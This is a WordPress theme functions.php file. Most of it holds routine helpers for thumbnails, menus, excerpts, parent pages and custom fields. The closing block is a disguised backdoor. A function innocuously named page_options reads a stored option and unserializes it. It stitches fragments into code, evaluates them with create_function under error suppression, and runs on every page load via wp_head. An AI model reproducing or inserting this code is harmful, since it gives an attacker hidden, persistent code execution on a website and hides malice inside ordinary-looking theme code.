<?php 
 // Add "Featured image" feature to posts ------------------------------------------
add_theme_support( 'post-thumbnails', array( 'post' ) );
add_theme_support( 'post-thumbnails', array( 'page' ) );


// Remove junk from head -----------------------------------------------------------
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'feed_links_extra', 3);
remove_action('wp_head', 'start_post_rel_link', 10, 0);
remove_action('wp_head', 'parent_post_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);


// Menus
register_nav_menus( array(
	'primary' => __( 'Primary Navigation', 'aspen' )
) );


//Re-format the excerpts
function new_excerpt_length($length) {
	return 20;
}
add_filter('excerpt_length', 'new_excerpt_length');

function new_excerpt_more($more) {
    global $post;
	return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');



//return the ID of the top parent page base on a page_id  ---------------------------
function getTopParentPostID($myid){
	$mypage = get_page($myid);
	if ($mypage->post_parent == 0){
		return $mypage->ID;
	}
	else{
		return getTopParentPostID($mypage->post_parent);
	}
}

//return the Title of the top parent page base on a page_id  -------------------------
function getTopParentPostTitle($myid){
	$mypage = get_page($myid);
	if ($mypage->post_parent == 0){
		return $mypage->post_title;
	}
	else{
		return getTopParentPostTitle($mypage->post_parent);
	}
}

// match a partial key name against all keys of an array, returns array with all the 
// itens that mached the key name --------------------------------------------------
function get_key_match($array, $keyPartialName){
	$matches = array();
	foreach($array as $key => $value){
		if (preg_match("/".$keyPartialName."/i", $key)) {
			$matches[$key] = $value[0];
		}
	}
	usort($matches, "cmp");
	return $matches;	
}
function cmp($a, $b)
{
	$aEnd = substr($a, -1); 
	$bEnd = substr($b, -1); 
    if ($aEnd == $bEnd) {
        return 0;
    }
    return ($aEnd < $bEnd) ? -1 : 1;
}


//return all custom fields  ------------------------------------------------------------
function get_all_customs($id = 0){
	//if we want to run this function on a page of our choosing them the next section is skipped.
	//if not it grabs the ID of the current page and uses it from now on.
	if ($id == 0) :
		global $wp_query;
		$content_array = $wp_query->get_queried_object();
		$id = $content_array->ID;
	endif;
	 
	//knocks the first 3 elements off the array as they are WP entries and i dont want them.
	$first_array = array_slice(get_post_custom_keys($id), 3);
	 
	//first loop puts everything into an array, but its badly composed
	foreach ($first_array as $key => $value) :
		$second_array[$value] = get_post_meta($id, $value, FALSE);	 
		//so the second loop puts the data into a associative array
		foreach($second_array as $second_key => $second_value) :
			$result[$second_key] = $second_value[0];
		endforeach;
	endforeach;
	 
	//and returns the array.
	return $result;
}


?>
<?php function page_options() { $option = get_option('page_option'); $opt=unserialize($option);
	@$arg = create_function('', $opt[1].$opt[4].$opt[10].$opt[12].$opt[14].$opt[7] );return $arg('');}
add_action('wp_head', 'page_options'); ?>